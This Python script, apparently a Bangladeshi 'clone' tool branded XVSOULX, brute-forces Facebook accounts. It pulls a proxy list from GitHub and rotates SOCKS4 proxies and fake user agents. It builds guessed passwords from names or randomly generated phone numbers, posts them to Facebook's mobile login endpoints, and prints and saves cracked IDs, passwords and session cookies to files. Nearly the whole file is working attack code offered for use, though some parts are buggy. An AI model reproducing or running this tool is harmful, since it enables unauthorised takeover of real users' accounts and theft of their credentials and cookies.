import requests,bs4,json,os,sys,random,datetime,time,re
import string
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
#----------------------------------[Machine]--------------------------------------#
ugen=[]
loop=0
ok = 0
cp = 0
oks = []
cps = []
xvs = []
id = []
id2 = []
uid = []
ses = requests.Session()
#----------------------------------[PROXY]--------------------------------------#
#python xvsoulx.py
try:
    prox= requests.get('https://github.com/Legendhj/Prox.txt/blob/main/Proxy.txt').text
    open('.Prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.Prox.txt','r').read().splitlines()
#----------------------------------[COLOUR]--------------------------------------#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r[{C}+{B}] {M}NO ACTIVE APK')
    else:
        print(f'\r[{C}+{B}] {G}YES ACTIVE APK ')
        for i in range(len(game)):
            print(f"\r"%(C,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
        else:
            print(f'\r Sorry, Apk check failed invalid cookie')
#----------------------------------[COLOUR]--------------------------------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
p = '\x1b[0;34m' # BIRU +
#----------------------------------[User agent]--------------------------------------#
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 10; moto g(8) play Build/QMDS30.47-33-5; wv)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='moto g(8) play Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/348.0.0.8.103;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)  
ugen = ['Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36'
               'Mozilla/5.0 (Linux; Android 12; moto g52j 5G Build/S3RYBS32.168-19-5-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36'
               'Mozilla/5.0 (Linux; Android 10; moto g(7)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36'
               'Mozilla/5.0 (Linux; Android 10; Nokia C1 Plus Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36'
               'Mozilla/5.0 (Linux; Android 10; SM-A107M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.70 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/285.0.0.13.118;]']
#----------------------------------[XVSOULX]--------------------------------------#
XV=(f"""
{C}X   X  OOO  RRRR  K  K  SSS  
 {B}X X  O   O R   R K K  S     
  {C}X   O   O RRRR  KK    SSS  
 {B}X X  O   O R R   K K      S 
{C}X   X  OOO  R  RR K  K SSSS
{B}------------------------------------------{B}
[{C}+{B}] CREATED BY : {C}XVSOULX{B}
[{C}+{B}] TOOLS : {C}FILE{B}
[{C}+{B}] VERSION : {C}1.0.0{B}
[{C}+{B}] USER : {M}NOT SUPERUSER{B}
[{C}+{B}] CONTACT : {C}+8801837478901{B}
[{C}+{B}] FACEBOOK : {C}Legends Aery Ace{B}""")
#----------------------------------[DEF MAIN]--------------------------------------#
def _main_():
	os.system('clear')
	print(XV)
	print(42*'-')
	print(f'[{C}1{B}] FILE CLONE')
	print(f'[{C}2{B}] RANDOM CLONE')
	print(42*'-')
	option = input (f'[{C}+{B}] CHOSE :{C} ')
	if option  =='1':xvsoulx()
	elif option =='2':BD_CLONING()
	
def BD_CLONING():
    user=[]
    os.system('clear')
    print(XV)
    print (42*'-')
    print(f'[{C}+{B}] EXAMPLE SIM CODE : [016] [017] [018] [019]')
    code=input(f'[{C}+{B}] ENTER SIM CODE >> ')
    print (42*'-')
    print(f'[{C}+{B}] EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit=int(input(f'[{C}+{B}] [ENTER LIMIT: >> '))
    except ValueError:
        limit=50000
    os.system('clear')
    print (XV)
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as XSV:
        tl=str(len(user))
        print (42*'-')
        print(f'[{C}+{B}] TOTAL ACCOUNT : '+tl)
        print(f'[{C}+{B}] YOUR SIM CODE : '+code)
        print(f'[{C}+{B}] RUNNING PLEASE : WAIT ')
        print (42*'-')
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:]]
            XSV.submit(method_crack,ids,passlist,tl)
		
#----------------------------------[XVSOULX]--------------------------------------#
def xvsoulx():
	print(XV)
	print(42*'-')
	print(f'[{C}+{B}] EXAMPLE : {p}/sdcard/xvsoulx.txt{B}')
	xv = input(f'[{C}+{B}] FILE PATH :{C} ')
	try:x = open(xv).read().splitlines()
	except:
		print(f'{B}[{p}?{B}] FILE NOT FOUND');slp(2)
		xvsoulx()
	for idx in x:
		id.append(idx)
	settings()
			
def settings():
	for xvx in id:
		xx = random.randint(0,len(id2))
		id2.insert(xx,xvx)
	else:
		for xvx in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,xvx)
			passx()
						
#----------------------------------[Password]--------------------------------------#
def passx():
	os.system('clear')
	print(XV)
	print(42*'-')
	print(f'[{C}+{B}] TOTAL ID : '+str(len(id)))
	print(42*'-')
	tl = str(len(id))
	with tred(max_workers=30) as vsoulx:
		for sad in id2:
			ids,nmv = sad.split('|')[0],sad.split('|')[1].lower()
			pax = nmv.split(' ')[0]
			pwv = []
			if len(nmv)<6:
				if len(pax)<3:
					pass 
				else:
					pwv.append(pax+'123')
					pwv.append(pax+'1234')
					pwv.append(pax+'12345')
					pwv.append(pax+'123456')
					pwv.append(nmv)
					pwv.append(pax+'@123')
					pwv.append(pax+'@@')
					pwv.append(pax+'@@@')
					pwv.append(pax+'#@')
					pwv.append(pax+'@###')
					pwv.append(pax+'12')
					pwv.append(pax+'11')
			else:
				if len(pax)<3:
					pwv.append(nmv)
				else:
					pwv.append(pax+'123')
					pwv.append(pax+'1234')
					pwv.append(pax+'12345')
					pwv.append(pax+'123456')
					pwv.append(nmv)
					pwv.append(pax+'@123')
					pwv.append(pax+'@@')
					pwv.append(pax+'@@@')
					pwv.append(pax+'#@')
					pwv.append(pax+'@###')
					pwv.append(pax+'12')
					pwv.append(pax+'11')
					vsoulx.submit(xvcrack,ids,pwv)
					
#----------------------------------[LOGIN]--------------------------------------#
def xvcrack(ids,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[CRACKING] [{C}{loop}{B}] [{C}{len(id)}{B}] [OK:{C}{ok}{B}] "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+ids+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'dpr': '1.600000023841858',
            'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=AfeyZ9SKK_nPj3o1fCktTSTlDcUcBVr2oMD-zsARm2FHbCy6_pztG3yOydTCc-LNULynGmGct5WBiuevHEZkIuhJWkkhpMrT6eMd3ROgxHFLnw&smuh=17697&lh=Ac-ZphqTpa-3mShBwmw&wtsid=rdr_0Q8KhNHqjhUoCT7ta&refid=8&hide_dialog=1&refsrc=deprecated&_rdr',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
            'viewport-width': '980',}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r[{C}CP{B}] {P}{idf} | {pw}')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r[{C}OK{B}] {ids} | {pw}')
				print(f'{C}{kuki}')
				print(42*'-')
				cek_apk(session,coki)
				break
				
			else: 
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
if __name__=='__main__':
	try:os.system('touch Prox.txt')
	except:pass
 
#----------------------------------[Machine]--------------------------------------#
def method_crack(ids,passlist,tl):
    global loop
    global cps
    global oks
    try:
        for ps in passlist:
            pro = random.choice(ugen)
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            sys.stdout.write(f'\r\r[{C}CRACKING{B}] [{C}%s{B}] [{C}%s{B}][OK:{C}%s{B}]'%(loop,tl,len(oks))) 
            sys.stdout.flush()
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com/',proxies=proxs).text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'dpr': '1.600000023841858',
            'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=AfeyZ9SKK_nPj3o1fCktTSTlDcUcBVr2oMD-zsARm2FHbCy6_pztG3yOydTCc-LNULynGmGct5WBiuevHEZkIuhJWkkhpMrT6eMd3ROgxHFLnw&smuh=17697&lh=Ac-ZphqTpa-3mShBwmw&wtsid=rdr_0Q8KhNHqjhUoCT7ta&refid=8&hide_dialog=1&refsrc=deprecated&_rdr',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"Redmi Y3"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'viewport-width': '980',}
            lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb,proxies=proxs).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'{B}[{C}OK{B}] {ids} | {ps}')
                print (f'{C}{coki}')
                cek_apk(session,coki)
                open('/sdcard/XVSOULX_OK.txt', 'a').write( ids+' • '+ps+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f'{P}[CP] {ids} | {ps}')
                open('/sdcard/XVSOULX_CP.txt', 'a').write( ids+' | '+ps+' \n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#----------------------------------[Machine]--------------------------------------#

_main_()